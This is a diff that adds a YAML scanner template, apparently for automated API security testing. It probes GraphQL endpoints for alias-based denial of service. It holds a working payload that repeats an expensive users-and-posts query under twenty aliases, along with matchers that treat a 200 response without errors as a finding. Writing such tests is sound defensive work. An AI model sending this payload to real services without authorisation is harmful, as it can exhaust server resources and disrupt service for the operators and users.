@@ -1,0 +1,57 @@
+id: graphql-alias-dos-attack
+info:
+  name: "GraphQL Alias-Based DoS Attack"
+  category: "API4:2023 Unrestricted Resource Consumption"
+  severity: "HIGH"
+  author: "hadrian"
+  description: "Tests for GraphQL alias-based denial of service by creating multiple aliases of expensive queries. Attackers can use aliases to execute the same expensive operation many times in a single request, bypassing simple query complexity limits that only count unique fields."
+  tags: ["graphql", "dos", "aliasing", "resource-exhaustion"]
+  requires_llm_triage: true
+  test_pattern: "simple"
+
+endpoint_selector:
+  requires_auth: false
+
+role_selector:
+  attacker_permission_level: "all"
+  victim_permission_level: "all"
+
+graphql:
+  - query: |
+      query AliasDoS {
+        alias1: users { id name email posts { id title } }
+        alias2: users { id name email posts { id title } }
+        alias3: users { id name email posts { id title } }
+        alias4: users { id name email posts { id title } }
+        alias5: users { id name email posts { id title } }
+        alias6: users { id name email posts { id title } }
+        alias7: users { id name email posts { id title } }
+        alias8: users { id name email posts { id title } }
+        alias9: users { id name email posts { id title } }
+        alias10: users { id name email posts { id title } }
+        alias11: users { id name email posts { id title } }
+        alias12: users { id name email posts { id title } }
+        alias13: users { id name email posts { id title } }
+        alias14: users { id name email posts { id title } }
+        alias15: users { id name email posts { id title } }
+        alias16: users { id name email posts { id title } }
+        alias17: users { id name email posts { id title } }
+        alias18: users { id name email posts { id title } }
+        alias19: users { id name email posts { id title } }
+        alias20: users { id name email posts { id title } }
+      }
+    matchers:
+      - type: status
+        status: [200]
+      - type: word
+        words: ["data"]
+        part: body
+
+detection:
+  success_indicators:
+    - type: status_code
+      status_code: 200
+    - type: body_field
+      body_field: "errors"
+      exists: false
+  vulnerability_pattern: "graphql_alias_based_dos"
